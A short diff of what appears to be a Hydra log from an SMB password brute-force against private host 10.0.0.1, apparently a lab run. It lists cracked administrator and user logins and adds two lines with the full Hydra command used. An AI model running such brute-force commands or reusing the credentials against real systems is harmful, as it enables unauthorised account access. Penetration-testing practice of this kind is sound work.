@@ -6,3 +6,5 @@
 [445][smb] host: 10.0.0.1   login: administrator   password: Passw0rd!
 [445][smb] host: 10.0.0.1   login: Administrator   password: Passw0rd!
 [445][smb] host: 10.0.0.1   login: leonard   password: Passw0rd!
+# Hydra v9.3 run at 2022-08-27 02:47:46 on 10.0.0.1 smb (hydra -L victimuser.lst -P victimpassword.lst -s 440-445 -vV -o hydra_output 10.0.0.1 smb)
+# Hydra v9.3 run at 2022-08-27 03:39:45 on 10.0.0.1 smb (hydra -L victimuser.lst -P victimpassword.lst -s 440-445 -vV -o hydra_output 10.0.0.1 smb)
